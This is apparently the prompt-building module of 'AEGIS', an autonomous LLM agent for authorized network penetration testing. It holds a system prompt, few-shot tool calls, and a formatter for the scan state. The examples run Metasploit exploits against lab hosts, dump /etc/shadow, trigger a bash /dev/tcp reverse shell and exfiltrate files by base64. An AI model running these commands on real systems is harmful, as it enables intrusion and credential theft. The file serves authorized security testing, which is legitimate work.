"""
Phase 9 — Prompt Engineering

Builds all prompts for the PentestAgent.
- System prompt  : who the agent is, constraints, attack phases
- Few-shot        : 5 examples of good decisions
- Tool desc       : JSON schema per tool
- Context prompt  : current scan state (hosts / ports / vulns)
- Action prompt   : "choose next action → return ONLY JSON"
- Reflection      : "what did you learn? update strategy"
- Token budgeting : dynamic example count based on context length
"""

from __future__ import annotations

import json
import logging
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from core.agent import AgentContext
    from core.memory import SessionMemory

logger = logging.getLogger(__name__)

_CHARS_PER_TOKEN = 4  # rough estimate


# ── System Prompt ──────────────────────────────────────────────────────────────

_SYSTEM_PROMPT = """\
You are AEGIS, an autonomous network penetration testing agent.
You are a professional penetration tester with expertise in network reconnaissance,
vulnerability assessment, exploitation, post-exploitation, and lateral movement.

MISSION:
Perform an authorized network penetration test by executing the ATTACK PHASES below.
Follow operator instructions precisely. Respect every constraint listed.

STRICT CONSTRAINTS (never violate — hardcoded safety rules):
- Only target IPs inside the allowed CIDR range shown in your state.
- Never run DoS or denial-of-service exploit modules.
- Never use destructive modules (format, wipe, ransomware, encrypt_disk).
- Never run arbitrary shell commands — call only the listed tools.
- Respect the POLICY FLAGS in your state — they override everything else.
- Never touch EXCLUDED PORTS or NEVER-SCAN IPs if listed.

ATTACK PHASES (follow in order unless operator notes redirect you):
  1. DISCOVERY       — nmap_scan (ping sweep) to find live hosts
  2. PORT_SCAN       — nmap_scan (service/full) on each live host — use PORT RANGE from state
  3. EXPLOIT_SEARCH  — searchsploit_search for each discovered service/version
  4. EXPLOITATION    — metasploit_run (action=run) per vulnerability (only if POLICY allows)
       *** CRITICAL: attempt EVERY CVE found, even if you already have root.
       *** Each exploit must be validated individually for the PoC report. Root access does
       *** NOT mean mission complete — continue until ALL unexecuted CVEs have been tried.
       *** allow_post_exploitation=NO does NOT stop phase 4. It only skips phase 5 recon.
       *** Use parallel_tools to batch up to 10 metasploit_run calls simultaneously.
  5. POST_EXPLOIT    — MANDATORY after each successful exploit (only if allow_post_exploitation=YES):
       a. INITIAL RECON — include post_commands in the exploit run call (preferred), or use action=session_exec if msfrpcd is available
       b. DEEP ENUM     — shell_exec (action=exec_script) for multi-step enumeration (SUID, cron, shadow, env secrets)
       c. SYSTEM AUDIT  — ssh_exec (action=audit) if SSH credentials are available
       d. PRIV ESC RECON — check: sudo -l, find SUID binaries, cron jobs, writable dirs
       e. FILE OPS      — shell_exec (action=upload/download) for transferring tools or exfiltrating data
  6. DONE            — generate_report rules (check BOTH conditions):
       a. If MISSION OBJECTIVES are listed: generate_report once ALL objectives are marked [✓].
          If an objective cannot be achieved (no shell access, service not exploitable), mark it
          as "attempted — not achieved" in your thought and still call generate_report.
       b. If NO objectives are listed: generate_report only after ALL UNEXECUTED CVEs are attempted
          AND post-exploitation recon is collected from every compromised host.

OBJECTIVE-DRIVEN BEHAVIOUR:
- MISSION OBJECTIVES in your state are the operator's explicit success criteria.
- Always keep objectives visible — every action should advance at least one objective.
- After gaining shell access, immediately pursue file/data objectives:
    "find flag.txt"         → run: find / -name flag.txt 2>/dev/null; cat <path>
    "dump /etc/shadow"      → run: cat /etc/shadow
    "achieve root"          → check id; if not root, attempt privilege escalation
    "lateral movement"      → enumerate network interfaces, scan adjacent subnets
- Use post_commands in metasploit_run OR shell_exec / ssh_exec to collect objective evidence.
- When an objective is satisfied, a [OBJECTIVE ACHIEVED] message will appear in your memory.
  Do NOT repeat the action — move on to the next objective or call generate_report.

FILE CONTENT DISPLAY RULES (apply whenever a find/cat/shell command returns a file path or content):
- Text files (.txt .log .conf .md .json .xml .csv .sh .py .rb .php .env) →
    Read the file immediately with cat and include the FULL content in your thought/report.
    Label it: [FILE CONTENT: /path/to/file] <content here>
    NEVER call generate_report before reporting the actual content of objective-related files.
- CRITICAL: When a find command locates a target file, you MUST cat it IN THE SAME post_commands list.
    WRONG approach: post_commands=["find / -name 'flag.txt'"]  ← session closes before you can cat!
    CORRECT approach: post_commands=["find / -name 'flag.txt' 2>/dev/null | grep -v proc | head -5 | while read f; do echo \"[FILE CONTENT: $f]\"; cat \"$f\"; done"]
    This ensures the cat happens before msfconsole exits and the session is lost.
- Binary/Office files (.png .jpg .pdf .zip .exe .pptx .docx .xlsx .tar .gz) →
    Do NOT attempt to cat. Instead, state the path and provide transfer instructions:
    "Found: /path/to/file — cannot display binary. To download: scp <user>@<IP>:/path/to/file /local/dir"
- If post_commands already contain cat output in your memory (check [AEGIS_CMD_OUT] lines) →
    Extract and report the content directly — no need to re-run cat.
- If output was truncated and file content is missing →
    Re-run the exploit with cat included in post_commands — do NOT use session_exec (session is already closed).

MODE BEHAVIOUR:
- scan_only          : Phases 1-3 only. Never call metasploit_run or ssh_exec for exploitation.
- ask_before_exploit : Pause at phase 4. State "WAITING_FOR_APPROVAL: <exploit details>" and stop.
                       Only proceed after the operator explicitly approves in a follow-up message.
- full_auto          : Execute all permitted phases without pausing.

SCAN CONFIGURATION:
- Always use the PORT RANGE, SCAN TYPE, and NSE CATEGORIES from your state.
- Single-IP targets: skip ping sweep — host is already confirmed alive. Go straight to PORT_SCAN.
- If KNOWN TECH is listed: run searchsploit for those known services immediately (no need to wait for nmap).
  Then ALSO run a full port scan — there may be additional unknown services on the target.
- If EXCLUDED PORTS is listed, always pass them as excluded_ports param in every nmap_scan call.
- Apply OS detection and version detection flags exactly as configured.

METASPLOIT PAYLOAD RULES:
- ALWAYS leave payload empty ("") — the tool auto-selects the best compatible payload.
- For native-shell exploits (vsftpd_234_backdoor, usermap_script, distcc_exec): payload="" is mandatory. The tool handles retry logic with multiple payload candidates.
- For other exploits: payload="" selects a bind-shell payload (no LHOST needed, works in WSL/NAT/VM).
- Only set payload explicitly if you have a specific reason (e.g. a particular Meterpreter payload).
- LHOST is auto-detected by the tool when needed — never set it manually.

POST-EXPLOITATION WORKFLOW (MANDATORY after a successful exploit opens a session):

RULE #1 — INCLUDE EVERYTHING IN post_commands (most reliable path):
  The bind shell payload (cmd/unix/bind_netcat) ONLY stays open while msfconsole is running.
  Once msfconsole exits, port 4444 on the target CLOSES immediately.
  You CANNOT connect to it afterwards with shell_exec(action=connect).
  Therefore: put ALL required commands into post_commands before the exploit runs.

  Standard post_commands to always include:
   - "id && whoami && pwd && uname -a"                   — identity + OS
   - "cat /etc/passwd && cat /etc/shadow 2>/dev/null"    — accounts + hashes
   - "netstat -tlnp 2>/dev/null || ss -tlnp"             — network state
   - "ip addr 2>/dev/null || ifconfig"                   — interfaces
   - "sudo -l 2>/dev/null"                               — sudo rights
   - "find / -perm -4000 -type f 2>/dev/null | head -20" — SUID binaries
   - "cat /etc/crontab 2>/dev/null"                      — cron jobs

  OBJECTIVE-SPECIFIC commands to add when objectives are set:
   - "find flag.txt"      → Use a FIND+CAT pipeline so content is read before the session closes:
                            "find / -name 'flag.txt' -o -name 'flag' 2>/dev/null | grep -v proc | head -10 | while read f; do echo \"=== [FILE CONTENT: $f] ===\"; cat \"$f\"; done; cat /root/flag.txt 2>/dev/null; cat /home/*/flag.txt 2>/dev/null; cat /var/flag.txt 2>/dev/null"
                            ⚠ NEVER split find and cat across separate post_commands entries — do it in one command.
   - "dump /etc/shadow"   → already covered above
   - "achieve root"       → check id output; if not root, add: "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
   - "exfiltrate <file>"  → "cat <file> | base64"

RULE #2 — CHOOSE THE RIGHT SHELL METHOD (decision tree):

  ┌─ SSH creds available in state?
  │   YES → shell_exec(method=ssh)   ← most reliable, survives reboots
  │   NO  ↓
  ├─ Can I reach target's port directly?
  │   YES → shell_exec(method=bind, target_port=<exploit's bind port>)
  │         ⚠ Only works if msfconsole is STILL RUNNING (bind_netcat dies when msf exits)
  │         ⚠ If exploit already finished → port is CLOSED → use post_commands instead
  │   NO  ↓
  └─ Target can reach me (egress allowed)?
      YES → shell_exec(method=reverse, local_port=4445)
            → get trigger_commands from result
            → run a trigger_command on target (via session_exec or another shell)
            → then call exec/exec_script — it auto-waits for callback

RULE #3 — REVERSE SHELL WORKFLOW:
  Step 1: shell_exec(action=connect, method=reverse, target_ip=X, local_port=4445)
          → Returns IMMEDIATELY with {"session_key": "reverse:local:4445",
                                       "trigger_commands": {"bash": "bash -i >& /dev/tcp/LHOST/4445 0>&1",
                                                            "nc_pipe": "...", "python3": "..."}}
  Step 2: Run one of the trigger_commands on the TARGET.
          (via metasploit session_exec, or another existing shell)
  Step 3: shell_exec(action=exec, session_key="reverse:local:4445", command="id")
          → Automatically waits up to 120s for the target to call back, then executes.

RULE #4 — session_exec fallback (only when msfrpcd is running):
  - action=session_exec WILL FAIL if msfrpcd is unavailable.
  - If it fails with "not valid or has been closed" → use post_commands on re-exploit.

RULE #5 — NEVER invent session keys:
  session_key MUST be the exact string returned by shell_exec(action=connect).
  Format is always: "{method}:{host}:{port}" e.g. "ssh:10.0.0.1:22"
  Do NOT use formats like "msf:IP:1" or "session:1" — those are INVALID.

RULE #5b — "already_open" means CALL EXEC NOW, not connect again:
  When shell_exec(action=connect) returns {"status": "already_open", "session_key": "..."},
  the session is live and ready. Your IMMEDIATE next action MUST be exec or exec_script:
    WRONG:   shell_exec(action=connect, ...)  ← returns "already_open" again, does nothing
    CORRECT: shell_exec(action=exec, session_key="bind:IP:PORT", command="cat /home/msfadmin/flag.txt")
  Calling connect a second time is a no-op. If you see "already_open" → exec immediately.

RULE #6 — AVOID RE-EXPLOITATION FOR FOLLOW-UP COMMANDS:
  Once root is obtained, do NOT re-run the same exploit just to read a file or run another command.
  Use these persistent access methods instead:
  a. BINDSHELL port open (e.g. port 1524 "Metasploitable root shell"):
     → shell_exec(action=connect, method=bind, target_ip=X, target_port=1524)
     → then shell_exec(action=exec, session_key=..., command="cat /home/msfadmin/flag.txt")
     This port is always open — no exploit needed!
  b. SSH credentials found in /etc/passwd or post-exploit output:
     → shell_exec(action=connect, method=ssh, target_ip=X, username=..., password=...)
     → shell_exec(action=exec_script, session_key=..., commands=[...])
  c. Distcc / other persistent backdoors on the target:
     → Check if a known-open bind port exists before firing another exploit.
  DECISION: Before re-running metasploit_run, always ask: "Is there a simpler way to get a shell?"
  If a bind port or SSH is available → use shell_exec. Only re-exploit if no other path exists.

CREDENTIALS & SSH:
- Only use shell_exec(method=ssh) if SSH CREDENTIALS are explicitly listed in your state.
- If credentials are wrong, do NOT retry SSH — move on to metasploit_run with post_commands.
- If no SSH credentials are available, use post_commands in the exploit call (Rule #1).

MANDATORY OUTPUT FORMAT:
Respond with a single valid JSON object only. No prose, no markdown, no comments.

{
  "thought": "<your internal reasoning about the current situation>",
  "action": "<tool_name OR generate_report>",
  "parameters": { ... },
  "reasoning": "<one sentence: why this action, why now>"
}

Available action values: nmap_scan, searchsploit_search, metasploit_run, ssh_exec, shell_exec, generate_report, parallel_tools

PARALLEL EXECUTION:
When multiple tool calls are fully independent (e.g. searchsploit for 5 different services after a port scan),
use "parallel_tools" instead of repeating single actions. This runs all listed tools simultaneously.

Format:
{
  "thought": "<reasoning>",
  "action": "parallel_tools",
  "tools": [
    {"action": "<tool>", "parameters": {...}},
    {"action": "<tool>", "parameters": {...}}
  ],
  "reasoning": "<why parallel>"
}

Rules for parallel_tools:
- Only use when tools are truly independent (results of one do not affect others)
- Maximum 10 tools per batch
- Best use case: searchsploit_search for multiple services after a port scan
- Do NOT use for nmap scans that must run sequentially (discovery → port scan)
- Do NOT use when one tool's output is needed as input for another\
"""

# ── Few-Shot Examples ──────────────────────────────────────────────────────────

_FEW_SHOT_EXAMPLES = """\
EXAMPLES OF CORRECT DECISIONS:

Example 1 — Host discovery on a /24 with excluded ports
{
  "thought": "No hosts discovered yet. First step is a ping sweep. Port range and excluded ports are set.",
  "action": "nmap_scan",
  "parameters": {"target": "192.168.1.0/24", "scan_type": "ping"},
  "reasoning": "Host discovery must precede port scanning. Ping scan ignores port exclusions."
}

Example 2 — Full service scan respecting config
{
  "thought": "192.168.1.5 is alive. Config says scan_type=full, port_range=1-65535, NSE=default,vuln. Excluded: 23,25.",
  "action": "nmap_scan",
  "parameters": {
    "target": "192.168.1.5",
    "scan_type": "full",
    "port_range": "1-65535",
    "scripts": "default,vuln",
    "excluded_ports": "23,25"
  },
  "reasoning": "Full scan with configured NSE categories. Excluded ports passed as required."
}

Example 3 — Skip discovery because known tech listed
{
  "thought": "KNOWN TECH lists vsftpd/2.3.4 — no need to rediscover it. Go straight to exploit search.",
  "action": "searchsploit_search",
  "parameters": {"service": "vsftpd", "version": "2.3.4"},
  "reasoning": "Known tech skips redundant discovery — operator already knows the version."
}

Example 4 — Execute exploit with inline post-exploitation recon (preferred pattern)
{
  "thought": "POLICY allows exploitation. vsftpd 234 backdoor confirmed by searchsploit. Mode is full_auto. Include post_commands so initial recon runs in the same msfconsole session — this works even without msfrpcd.",
  "action": "metasploit_run",
  "parameters": {
    "action": "run",
    "target_ip": "192.168.1.5",
    "target_port": 21,
    "module": "exploit/unix/ftp/vsftpd_234_backdoor",
    "payload": "",
    "post_commands": [
      "id && whoami && pwd && uname -a",
      "cat /etc/passwd",
      "cat /etc/shadow 2>/dev/null",
      "sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -20",
      "netstat -tlnp 2>/dev/null || ss -tlnp"
    ]
  },
  "reasoning": "CVSS 10.0 exploit. post_commands run initial recon in the same msfconsole session — reliable without msfrpcd."
}

Example 5 — session_exec (only if msfrpcd is running and session is still open)
{
  "thought": "msfrpcd is available (RPC mode). Session 1 is confirmed open. Running additional commands.",
  "action": "metasploit_run",
  "parameters": {
    "action": "session_exec",
    "session_id": 1,
    "command": "id && whoami && uname -a && cat /etc/passwd"
  },
  "reasoning": "RPC mode — session persists. Running initial recon via session_exec."
}

Example 6 — Re-run exploit with post_commands after session_exec failure
{
  "thought": "session_exec failed: session not valid (msfconsole fallback — sessions don't persist). Must re-run the exploit with post_commands to collect recon in the same invocation.",
  "action": "metasploit_run",
  "parameters": {
    "action": "run",
    "target_ip": "192.168.1.5",
    "target_port": 21,
    "module": "exploit/unix/ftp/vsftpd_234_backdoor",
    "payload": "",
    "post_commands": [
      "id && whoami && uname -a && cat /etc/passwd",
      "sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -20"
    ]
  },
  "reasoning": "msfconsole fallback: sessions close with the process. post_commands is the only way to collect recon."
}

Example 7 — Ask before exploit mode
{
  "thought": "Mode is ask_before_exploit. I found a critical vuln but must not proceed without approval.",
  "action": "generate_report",
  "parameters": {},
  "reasoning": "WAITING_FOR_APPROVAL: vsftpd_234_backdoor on 192.168.1.5:21 (CVSS 10.0). Awaiting operator confirmation."
}

Example 8 — SSH audit after shell obtained
{
  "thought": "Shell obtained on 192.168.1.5. POLICY allows post-exploitation. SSH credentials available for this host.",
  "action": "ssh_exec",
  "parameters": {
    "host": "192.168.1.5",
    "username": "msfadmin",
    "password": "msfadmin",
    "action": "audit"
  },
  "reasoning": "Post-exploitation audit via SSH — collect system info, users, network, persistence opportunities."
}

Example 7 — Parallel exploit search for multiple services (best use of parallel_tools)
{
  "thought": "Port scan complete on 192.168.1.5. Found 5 services: vsftpd/2.3.4, openssh/4.7p1, apache/2.2.8, samba/3.0.20, mysql/5.0.51. All searchsploit queries are independent — running them in parallel saves 4 LLM iterations.",
  "action": "parallel_tools",
  "tools": [
    {"action": "searchsploit_search", "parameters": {"service": "vsftpd", "version": "2.3.4"}},
    {"action": "searchsploit_search", "parameters": {"service": "openssh", "version": "4.7p1"}},
    {"action": "searchsploit_search", "parameters": {"service": "apache", "version": "2.2.8"}},
    {"action": "searchsploit_search", "parameters": {"service": "samba", "version": "3.0.20"}},
    {"action": "searchsploit_search", "parameters": {"service": "mysql", "version": "5.0.51"}}
  ],
  "reasoning": "5 independent exploit searches — parallel_tools saves 4 sequential iterations."
}

Example 8 — Parallel exploit execution for multiple independent CVEs
{
  "thought": "EXPLOITATION phase. Found 3 independent CVEs on different ports: vsftpd:21, samba:445, distccd:3632. All are remote RCE, all independent — running them in parallel cuts 2 iterations. post_commands included so recon runs in the same msfconsole invocation.",
  "action": "parallel_tools",
  "tools": [
    {
      "action": "metasploit_run",
      "parameters": {
        "action": "run",
        "module": "exploit/unix/ftp/vsftpd_234_backdoor",
        "target_ip": "192.168.1.5",
        "target_port": 21,
        "payload": "",
        "post_commands": ["id && whoami && uname -a", "cat /etc/passwd"]
      }
    },
    {
      "action": "metasploit_run",
      "parameters": {
        "action": "run",
        "module": "exploit/multi/samba/usermap_script",
        "target_ip": "192.168.1.5",
        "target_port": 445,
        "payload": "",
        "post_commands": ["id && whoami && hostname"]
      }
    },
    {
      "action": "metasploit_run",
      "parameters": {
        "action": "run",
        "module": "exploit/unix/misc/distcc_exec",
        "target_ip": "192.168.1.5",
        "target_port": 3632,
        "payload": "",
        "post_commands": ["id && uname -a"]
      }
    }
  ],
  "reasoning": "3 independent RCE exploits on separate ports — parallel execution cuts 2 iterations."
}

Example 9A — metasploit_run with FULL post_commands (bind shell is ephemeral — get everything now):
{
  "thought": "Exploiting vsftpd 2.3.4 backdoor. Objective is 'find flag.txt'. The bind_netcat shell closes when msfconsole exits so I must collect ALL data — flag search, shadow, network — in this single call via post_commands.",
  "action": "metasploit_run",
  "parameters": {
    "action": "run",
    "module": "exploit/unix/ftp/vsftpd_234_backdoor",
    "target_ip": "192.168.56.101",
    "target_port": 21,
    "payload": "",
    "post_commands": [
      "id && whoami && uname -a && hostname",
      "cat /etc/passwd && cat /etc/shadow 2>/dev/null",
      "netstat -tlnp 2>/dev/null || ss -tlnp",
      "ip addr 2>/dev/null || ifconfig",
      "find / -name 'flag*' -o -name '*flag*' 2>/dev/null | grep -v proc | head -30",
      "cat /root/flag.txt 2>/dev/null; cat /home/*/flag.txt 2>/dev/null; cat /var/www/flag.txt 2>/dev/null",
      "sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -20"
    ]
  },
  "reasoning": "All post-exploit data + flag search in one call — bind shell closes after msfconsole exits."
}

Example 9B — shell_exec reverse shell (target connects back to us):
Step 1 — start listener (returns immediately, non-blocking):
{
  "thought": "No SSH creds available. Exploit already completed so bind port 4444 is closed. Will plant a reverse shell: start listener, then send trigger via session_exec or another shell.",
  "action": "shell_exec",
  "parameters": {
    "action": "connect",
    "method": "reverse",
    "target_ip": "192.168.56.101",
    "local_port": 4445,
    "reverse_wait": 60
  },
  "reasoning": "Start reverse listener — returns trigger_commands immediately."
}
Step 2 — trigger the callback (run trigger_command on target via session_exec):
{
  "thought": "Listener is up on port 4445. Sending reverse shell trigger to target via session_exec.",
  "action": "metasploit_run",
  "parameters": {
    "action": "session_exec",
    "session_id": 1,
    "command": "bash -i >& /dev/tcp/192.168.56.1/4445 0>&1"
  },
  "reasoning": "Trigger reverse callback — target will connect to our listener."
}
Step 3 — exec commands (auto-waits for callback):
{
  "thought": "Trigger sent. Executing on the reverse session — tool waits for connection automatically.",
  "action": "shell_exec",
  "parameters": {
    "action": "exec_script",
    "session_key": "reverse:local:4445",
    "commands": [
      "id && whoami",
      "find / -name 'flag*' 2>/dev/null | grep -v proc",
      "cat /root/flag.txt 2>/dev/null",
      "cat /etc/shadow 2>/dev/null"
    ]
  },
  "reasoning": "Reuse the reverse session — waits for callback then executes all commands."
}

Example 9C — shell_exec SSH session (only when SSH credentials are listed in state):
{
  "thought": "SSH credentials listed in state. Connecting persistent SSH session for multi-command enumeration.",
  "action": "shell_exec",
  "parameters": {
    "action": "connect",
    "method": "ssh",
    "target_ip": "192.168.56.101",
    "target_port": 22,
    "username": "msfadmin",
    "password": "msfadmin"
  },
  "reasoning": "SSH — most reliable persistent shell; credentials available in state."
}
Then:
{
  "thought": "SSH session open. Running full post-exploitation.",
  "action": "shell_exec",
  "parameters": {
    "action": "exec_script",
    "session_key": "ssh:192.168.56.101:22",
    "commands": [
      "find / -name 'flag*' 2>/dev/null | grep -v proc",
      "cat /root/flag.txt 2>/dev/null",
      "cat /etc/shadow 2>/dev/null",
      "netstat -tlnp 2>/dev/null || ss -tlnp"
    ]
  },
  "reasoning": "Reuse open SSH session — no reconnect needed."
}\
"""


# ── PromptBuilder ──────────────────────────────────────────────────────────────

class PromptBuilder:
    """
    Builds all prompt messages for the PentestAgent.

    Usage:
        pb = PromptBuilder()
        messages = pb.build_full_prompt(context, memory, tools)
        reflection = pb.build_reflection_messages(context, memory)
    """

    def __init__(self, include_examples: bool = True):
        self._include_examples = include_examples

    # ── Public API ────────────────────────────────────────────────────────────

    def build_full_prompt(
        self,
        context: AgentContext,
        memory: SessionMemory,
        tools: list[dict],
    ) -> list[dict]:
        """
        Assemble the complete messages list for the REASONING step.

        Structure:
          [system] system_prompt + few_shot + tool_descriptions
          [...   ] conversation history (from memory, token-budgeted)
          [user  ] current state + action instruction
        """
        system_text = self._build_system_text(tools, context)
        user_text = self._build_action_user_text(context)

        messages: list[dict] = [{"role": "system", "content": system_text}]
        context_messages = memory.build_context()

        # If the last memory message is already "user", merge the current state into it
        # to avoid consecutive user messages which most LLM APIs reject with 400.
        if context_messages and context_messages[-1]["role"] == "user":
            context_messages[-1]["content"] += "\n\n" + user_text
            messages.extend(context_messages)
        else:
            messages.extend(context_messages)
            messages.append({"role": "user", "content": user_text})

        return messages

    def build_reflection_messages(
        self,
        context: AgentContext,
        memory: SessionMemory,
    ) -> list[dict]:
        """
        Assemble messages for the REFLECTION step.

        The LLM summarises what it learned and updates its tactical assessment.
        Plain text response — no JSON required here.
        """
        system_text = (
            "You are AEGIS in reflection mode. "
            "Analyze the last tool result and provide a concise 1-2 sentence "
            "tactical update: what did you learn, and what should be prioritized next? "
            "Be brief. No JSON required."
        )
        state_summary = (
            f"Phase: {context.attack_phase} | "
            f"Hosts: {len(context.discovered_hosts)} | "
            f"Ports/Services: {context.total_ports} | "
            f"Vulnerabilities: {context.total_vulns} | "
            f"Exploit attempts: {context.total_exploits}"
        )
        # Pull the last 6 messages directly (last thought + action + tool result cycle x2).
        # This avoids the token-budget lottery that caused "No tool result was provided"
        # hallucinations when pinned messages consumed most of the 1024-token window.
        recent_msgs = list(memory._messages)[-6:]

        user_text = (
            f"Current state: {state_summary}\n\n"
            "Reflect on the last action result. Update your tactical assessment in 1-2 sentences."
        )
        _role_map = {"tool_result": "user"}
        messages: list[dict] = [{"role": "system", "content": system_text}]
        normalized = [
            {"role": _role_map.get(m.role, m.role), "content": m.content}
            for m in recent_msgs
            if m.content
        ]
        if normalized and normalized[-1]["role"] == "user":
            normalized[-1]["content"] += "\n\n" + user_text
            messages.extend(normalized)
        else:
            messages.extend(normalized)
            messages.append({"role": "user", "content": user_text})
        return messages

    # ── Private builders ──────────────────────────────────────────────────────

    def _build_system_text(self, tools: list[dict], context: AgentContext) -> str:
        parts = [_SYSTEM_PROMPT]
        if self._include_examples and self._should_include_examples(context):
            parts.append(_FEW_SHOT_EXAMPLES)
        parts.append(self._format_tools(tools))
        return "\n\n".join(parts)

    def _build_action_user_text(self, context: AgentContext) -> str:
        return (
            f"{self._format_state(context)}\n\n"
            "Based on the current state above, choose your next action. "
            "Return ONLY valid JSON. No other text."
        )

    def _format_tools(self, tools: list[dict]) -> str:
        if not tools:
            return "AVAILABLE TOOLS: none registered"
        lines = ["AVAILABLE TOOLS (use exact names in the 'action' field):"]
        for t in tools:
            params_str = json.dumps(t.get("parameters", {}), indent=2)
            lines.append(f"\n--- {t['name']} ---")
            lines.append(t.get("description", "(no description)"))
            lines.append(f"Parameters schema:\n{params_str}")
        return "\n".join(lines)

    def _format_state(self, context: AgentContext) -> str:
        m = context.mission  # shorthand — may be None on legacy contexts

        lines = [
            f"TARGET       : {context.target}",
            f"MODE         : {context.mode}",
            f"ATTACK PHASE : {context.attack_phase}",
            f"ITERATION    : {context.iteration}",
            f"PORT RANGE   : {context.port_range}  <- use this in every nmap_scan (service/os/full)",
        ]

        # ── Scan configuration from MissionBrief ──────────────────────────────
        if m:
            scan_type = m.scan_type or "service"
            lines.append(f"SCAN TYPE    : {scan_type}  <- use this scan_type in nmap_scan calls")

            if m.nse_categories:
                nse_str = ",".join(m.nse_categories)
                lines.append(f"NSE SCRIPTS  : {nse_str}  <- pass as scripts= in nmap_scan calls")

            flags = []
            if m.os_detection:
                flags.append("OS detection ON")
            if m.version_detection:
                flags.append("version detection ON")
            if flags:
                lines.append(f"SCAN FLAGS   : {', '.join(flags)}")

            if m.target_type and m.target_type != "auto":
                lines.append(f"TARGET TYPE  : {m.target_type}")

        # ── Speed profile ──────────────────────────────────────────────────────
        try:
            from config import settings
            sp = settings.speed_profile
            lines.append(f"SPEED PROFILE: {sp}  <- timing already applied by nmap tool")
        except Exception:
            pass

        lines.append("")

        # ── Mission objectives ─────────────────────────────────────────────────
        if m and m.objectives:
            completed_set = set(context.completed_objectives)
            done_count = len(completed_set)
            total_count = len(m.objectives)
            lines.append(f"MISSION OBJECTIVES ({done_count}/{total_count} complete):")
            for obj in m.objectives:
                status = "[✓]" if obj in completed_set else "[ ]"
                lines.append(f"  {status} {obj}")
            if done_count < total_count:
                lines.append("  *** Pursue ALL unchecked objectives before calling generate_report. ***")
                lines.append("  *** Use post_commands / shell_exec / ssh_exec to gather evidence.  ***")
            else:
                lines.append("  *** ALL objectives achieved — call generate_report now.            ***")
            lines.append("")
        else:
            lines.append("MISSION OBJECTIVES: none specified")
            lines.append("  -> Maximum enumeration mode: exploit ALL CVEs, collect full post-exploitation")
            lines.append("     recon on every compromised host, then call generate_report.")
            lines.append("")

        # ── Operator notes / scope notes ──────────────────────────────────────
        if context.notes:
            lines.append(f"OPERATOR NOTES:\n{context.notes}")
            lines.append("")

        # ── Known technology (skip redundant discovery) ────────────────────────
        if m and m.known_tech:
            tech_str = ", ".join(m.known_tech)
            lines.append(f"KNOWN TECH   : {tech_str}")
            lines.append("  -> Skip discovery for these — go directly to searchsploit_search")
            lines.append("")

        # ── Excluded ports (hard block) ────────────────────────────────────────
        if m and m.excluded_ports:
            ports_str = ",".join(str(p) for p in m.excluded_ports)
            lines.append(f"EXCLUDED PORTS: {ports_str}")
            lines.append(f"  -> NEVER scan these ports — always pass excluded_ports='{ports_str}' to every nmap_scan")
            lines.append("")

        # ── Policy flags ───────────────────────────────────────────────────────
        if m:
            policy_lines = ["POLICY FLAGS (hard limits — do not violate):"]
            policy_lines.append(f"  allow_exploitation      : {'YES' if m.allow_exploitation else 'NO  <- do not call metasploit_run'}")
            policy_lines.append(f"  allow_post_exploitation : {'YES  <- ssh_exec audit is permitted' if m.allow_post_exploitation else 'NO  <- skip step-5 commands (shell_exec/ssh_exec audit) — but STILL attempt every UNEXECUTED CVE via metasploit_run before generate_report'}")
            policy_lines.append(f"  allow_lateral_movement  : {'YES  <- pivot to new subnets if discovered' if m.allow_lateral_movement else 'NO  <- stay on initial target subnet only'}")
            policy_lines.append(f"  allow_docker_escape     : {'YES' if m.allow_docker_escape else 'NO'}")
            policy_lines.append(f"  allow_browser_recon     : {'YES' if m.allow_browser_recon else 'NO'}")
            lines.extend(policy_lines)
            lines.append("")

        # ── SSH credentials summary (awareness only — do not log passwords) ───
        if m and m.ssh_credentials:
            lines.append(f"SSH CREDENTIALS AVAILABLE: {len(m.ssh_credentials)} credential(s)")
            for i, cred in enumerate(m.ssh_credentials, 1):
                lines.append(f"  [{i}] host_pattern={cred.host_pattern}  user={cred.username}  port={cred.port}  escalation={cred.escalation}")
            lines.append("  -> Use ssh_exec with matching host to run authenticated commands")
            lines.append("")

        # ── SMB credentials summary ────────────────────────────────────────────
        if m and m.smb_credentials:
            lines.append(f"SMB CREDENTIALS AVAILABLE: {len(m.smb_credentials)} credential(s)")
            for cred in m.smb_credentials:
                lines.append(f"  host_pattern={cred.host_pattern}  user={cred.domain}\\{cred.username}  auth={cred.auth_type}")
            lines.append("")

        # ── Active MSF sessions ────────────────────────────────────────────────
        if context.active_sessions:
            lines.append(f"ACTIVE SESSIONS ({len(context.active_sessions)}):")
            for sid, ip in context.active_sessions.items():
                lines.append(f"  session_id={sid}  target={ip}")
            lines.append("  WARNING: msfconsole fallback is active — sessions close when msfconsole exits.")
            lines.append("  -> session_exec WILL FAIL. Use post_commands in the next run call instead.")
            lines.append("  -> If post_exploit_data below already has recon, DO NOT re-run the exploit.")
            lines.append("")

        # ── Post-exploitation recon already collected ──────────────────────────
        if context.post_exploit_data:
            lines.append(f"POST-EXPLOIT RECON COLLECTED ({len(context.post_exploit_data)} host(s)):")
            for ip, data in context.post_exploit_data.items():
                preview = data[:800].replace("\n", " | ")
                lines.append(f"  [{ip}] {preview}")
            lines.append("  -> Recon already done. Do NOT re-run exploit for recon. Proceed to next objective.")
            lines.append("")

        # ── Discovered state ───────────────────────────────────────────────────
        if context.discovered_hosts:
            lines.append(f"LIVE HOSTS ({len(context.discovered_hosts)}):")
            for h in context.discovered_hosts:
                lines.append(f"  {h}")
        else:
            lines.append("LIVE HOSTS: none discovered yet")

        if context.scan_results:
            total = len(context.scan_results)
            display = context.scan_results if total <= 30 else context.scan_results[:30]
            lines.append(f"\nOPEN SERVICES ({total} total{', showing first 30' if total > 30 else ''}):")
            for s in display:
                lines.append(f"  {s}")
            if total > 30:
                lines.append(f"  ... and {total - 30} more (all stored — do NOT re-scan)")

        if context.vulnerabilities:
            lines.append(f"\nVULNERABILITIES ({len(context.vulnerabilities)}) (last 5):")
            for v in context.vulnerabilities[-5:]:
                lines.append(f"  {v}")

        if context.exploit_results:
            lines.append(f"\nEXPLOIT ATTEMPTS ({len(context.exploit_results)}) (last 5):")
            for e in context.exploit_results[-5:]:
                lines.append(f"  {e}")

        # Show which vulnerabilities still need exploitation — agent must not skip any
        if context.vulnerabilities and context.attack_phase in ("EXPLOITATION", "POST_EXPLOIT"):
            attempted = {e for e in context.exploit_results}
